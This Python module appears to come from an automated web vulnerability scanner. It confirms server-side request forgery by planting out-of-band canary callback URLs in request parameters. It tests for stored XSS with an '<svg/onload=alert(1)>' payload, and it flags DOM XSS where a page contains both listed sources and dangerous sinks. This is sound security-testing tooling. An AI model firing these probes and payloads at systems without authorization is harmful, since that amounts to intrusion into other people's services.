"""Phase 3 verifiers — SSRF (OOB-confirmed), stored XSS, DOM-XSS candidates.

SSRF is proven only by a real callback to the built-in OOB listener (the target
actually connected to our canary). Stored XSS is proven by the payload surfacing
*unencoded on a different page* than where it was injected. DOM XSS can't be
proven headless, so it's surfaced as needs-review with the source→sink evidence.
"""
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .verifiers import XSS_MARK   # reuse the reflected marker style


def _params(url):
    p = urlparse(url)
    return p, parse_qs(p.query, keep_blank_values=True)


def _set_param(url, key, value):
    p, q = _params(url)
    q = {k: v[:] for k, v in q.items()}
    q[key] = [value]
    flat = urlencode([(k, vv) for k, vals in q.items() for vv in vals])
    return urlunparse(p._replace(query=flat))


def _f(title, vclass, sev, cvss, conf, desc, steps, req, resp):
    return dict(title=title, vuln_class=vclass, severity=sev, cvss=cvss,
                confidence=conf, description=desc, steps=steps,
                poc_request=req, poc_response=resp)


# ---- SSRF (OOB-confirmed) -------------------------------------------------
SSRF_PARAMS = {"url", "uri", "u", "link", "src", "source", "dest", "destination",
               "redirect", "redirect_url", "next", "continue", "return", "image",
               "img", "imageurl", "callback", "webhook", "feed", "rss", "host",
               "domain", "site", "path", "page", "file", "load", "fetch", "proxy",
               "target", "to", "out", "view", "data", "reference", "ref"}


def _looks_url(val):
    return bool(re.match(r"https?://", val or "")) or (val or "").startswith("//")


def check_ssrf(send, url, make_callback, was_hit):
    """make_callback(tag) -> (token, callback_url); was_hit(token) -> bool.
    Plants the callback URL in each likely param; confirmed on a real hit."""
    _, q = _params(url)
    out = []
    candidates = [k for k in q if k.lower() in SSRF_PARAMS or _looks_url((q[k] or [""])[0])]
    for key in candidates:
        token, cb = make_callback("ssrf")
        test = _set_param(url, key, cb)
        send("GET", test)
        if was_hit(token):
            out.append(_f(
                f"Server-Side Request Forgery via '{key}'", "hunt-ssrf", "high",
                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L", "confirmed",
                f"Parameter '{key}' on {url} caused the server to make an outbound request to our "
                f"controlled canary (OOB callback received). This can reach internal services and "
                f"cloud metadata.",
                f"GET {test} → the server connected back to the OOB host.",
                f"GET {test}", f"OOB callback received for token {token}"))
    return out


# ---- Stored XSS (two-step) -----------------------------------------------
STORED_PAYLOAD = f'{XSS_MARK}s"><svg/onload=alert(1)>'


def check_stored_xss(send, inject_url, probe_urls):
    """Inject a marker, then look for it UNENCODED on other pages."""
    _, q = _params(inject_url)
    out = []
    for key in q:
        send("GET", _set_param(inject_url, key, STORED_PAYLOAD))
        for probe in probe_urls:
            if probe == inject_url:
                continue
            r = send("GET", probe)
            if r.get("ok") and f'{XSS_MARK}s"><svg' in (r.get("text") or ""):
                out.append(_f(
                    f"Stored XSS via '{key}'", "hunt-xss", "critical",
                    "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N", "confirmed",
                    f"A payload injected into '{key}' at {inject_url} is stored and rendered "
                    f"unencoded on {probe}, executing for other users.",
                    f"Inject into {key} at {inject_url}; load {probe} to see it fire.",
                    f"GET {_set_param(inject_url, key, STORED_PAYLOAD)}",
                    (r.get("text") or "")[:800]))
                return out       # one proven stored XSS is enough
    return out


# ---- DOM XSS (static candidate -> needs-review) --------------------------
DOM_SOURCES = ["location.hash", "location.search", "location.href", "document.URL",
               "document.referrer", "window.name", "location.pathname"]
DOM_SINKS = ["innerHTML", "outerHTML", "document.write", "eval(", ".insertAdjacentHTML",
             "setTimeout(", "$(", ".html(", "new Function("]


def check_dom_xss(send, url):
    r = send("GET", url)
    if not r.get("ok"):
        return []
    body = r.get("text") or ""
    srcs = [s for s in DOM_SOURCES if s in body]
    sinks = [s for s in DOM_SINKS if s in body]
    if srcs and sinks:
        return [_f(
            "Potential DOM XSS (source reaches sink)", "hunt-dom", "medium", "",
            "needs-review",
            f"{url} contains DOM sources ({', '.join(srcs[:3])}) and dangerous sinks "
            f"({', '.join(sinks[:3])}). Execution can't be proven without a browser — verify the data flow.",
            f"Review the JS on {url}; trace {srcs[0]} into {sinks[0]}.",
            f"GET {url}", "sources: %s | sinks: %s" % (srcs, sinks))]
    return []
